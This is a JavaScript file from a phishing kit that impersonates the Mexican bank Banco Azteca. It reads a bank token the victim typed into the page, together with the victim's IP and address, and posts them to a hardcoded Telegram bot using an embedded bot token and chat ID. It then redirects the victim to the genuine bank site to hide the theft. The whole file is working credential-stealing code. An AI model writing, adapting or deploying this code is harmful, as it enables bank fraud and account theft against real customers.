//bot token
var telegram_bot_id = "7479463983:AAFZvTURJ_yPF3uM4V3q5sAtyo7lBZ1zFuc";
//chat id
var chat_id = 6558902468;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("usr").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "BANCO AZTECA\nToken: " + u_name + "\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://www.bancoazteca.com.mx/';
        console.log(response);
    });
    return false;
};
